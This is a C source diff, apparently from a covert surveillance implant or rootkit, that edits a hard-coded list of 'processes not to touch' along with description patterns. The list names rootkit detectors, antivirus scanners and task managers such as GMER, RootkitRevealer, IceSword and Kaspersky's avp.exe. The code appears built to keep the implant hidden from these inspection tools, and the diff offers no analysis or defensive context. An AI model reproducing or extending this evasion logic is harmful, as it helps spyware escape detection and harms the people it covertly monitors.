@@ -2357,21 +2357,22 @@ void HM_UpdateGlobalConf()
 	memset(&date_delta, 0, sizeof(date_delta));
 	// Lista di processi da non toccare
 	process_bypassed = EMBEDDED_BYPASS;
+	ZeroMemory(process_bypass_list, sizeof(process_bypass_list));
 	strcpy(process_bypass_list[0],"outlook.exe");
-	strcpy(process_bypass_list[1],"taskmgr.exe");
-	strcpy(process_bypass_list[2],"KProcCheck.exe");
+	//strcpy(process_bypass_list[1],"gmer.exe");
+	//strcpy(process_bypass_list[2],"KProcCheck.exe");
 	strcpy(process_bypass_list[3],"TaskMan.exe");
 	strcpy(process_bypass_list[4],"hackmon.exe");
 	strcpy(process_bypass_list[5],"hiddenfinder.exe");
 	strcpy(process_bypass_list[6],"Unhackme.exe");
-	strcpy(process_bypass_list[7],"blbeta.exe");
+	//strcpy(process_bypass_list[7],"blbeta.exe");
 	strcpy(process_bypass_list[8],"fsbl.exe");
 	strcpy(process_bypass_list[9],"sargui.exe");
 	strcpy(process_bypass_list[10],"avgarkt.exe");
 	strcpy(process_bypass_list[11],"avscan.exe");
 	strcpy(process_bypass_list[12],"RootkitRevealer.exe");
-	strcpy(process_bypass_list[13],"avgscanx.exe");
-	strcpy(process_bypass_list[14],"gmer.exe");
+	strcpy(process_bypass_list[13],"taskmgr.exe");
+	strcpy(process_bypass_list[14],"avgscanx.exe");
 	strcpy(process_bypass_list[15],"IceSword.exe");
 	strcpy(process_bypass_list[16],"svv.exe");
 	strcpy(process_bypass_list[17],"rku*.exe");
@@ -2390,6 +2391,34 @@ void HM_UpdateGlobalConf()
 
 	// Gestisco le descrizioni per i processi per cui le ho
 	ZeroMemory(process_bypass_desc, sizeof(process_bypass_desc));
+	wcscpy(process_bypass_desc[0],L"*Outlook*");
+	wcscpy(process_bypass_desc[3],L"Security Task Manager");
+	wcscpy(process_bypass_desc[4],L"Detects*rootkits*");
+	wcscpy(process_bypass_desc[5],L"*Hidden*Process*Finder*");
+	wcscpy(process_bypass_desc[6],L"Detects*rootkits*");
+	wcscpy(process_bypass_desc[8],L"*Secure*BlackLight*");
+
+	wcscpy(process_bypass_desc[26],L"*Internet Explorer*");
+	wcscpy(process_bypass_desc[27],L"*Google Chrome*");
+
+	
+/*	
+	wcscpy(process_bypass_desc[9],L"sargui.exe");
+	wcscpy(process_bypass_desc[10],L"avgarkt.exe");
+	wcscpy(process_bypass_desc[11],L"avscan.exe");
+	wcscpy(process_bypass_desc[12],L"RootkitRevealer.exe");
+	wcscpy(process_bypass_desc[15],L"IceSword.exe");
+	wcscpy(process_bypass_desc[16],L"svv.exe");
+	wcscpy(process_bypass_desc[17],L"rku*.exe");
+	wcscpy(process_bypass_desc[18],L"pavark.exe");
+	wcscpy(process_bypass_desc[19],L"avp.exe");
+	wcscpy(process_bypass_desc[20],L"bgscan.exe");
+	wcscpy(process_bypass_desc[21],L"admin.exe");
+	wcscpy(process_bypass_desc[22],L"avk.exe");
+	wcscpy(process_bypass_desc[23],L"k7*.exe");
+	wcscpy(process_bypass_desc[24],L"rootkitbuster.exe");
+	wcscpy(process_bypass_desc[25],L"pcts*.exe");
+	wcscpy(process_bypass_desc[28],L"fsm32.exe");*/
 
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
